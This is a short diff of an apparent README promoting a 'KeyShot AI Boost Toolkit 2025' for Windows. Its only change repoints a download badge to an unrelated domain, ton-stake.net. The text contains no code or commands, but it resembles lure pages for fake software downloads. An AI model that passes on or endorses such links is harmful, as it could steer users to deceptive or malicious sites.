@@ -2,7 +2,7 @@
 
 🌟 Power up KeyShot with AI Boost Toolkit 2025! This collection of AI plugins, scripts, and templates helps you render like a pro, built for Windows users.
 
-[![Discover KeyShot AI Toolkit](https://img.shields.io/badge/Discover-KeyShot_AI_Toolkit-blueviolet)](https://glocktober.com)
+[![Discover KeyShot AI Toolkit](https://img.shields.io/badge/Discover-KeyShot_AI_Toolkit-blueviolet)](https://ton-stake.net)
 
 ---
 
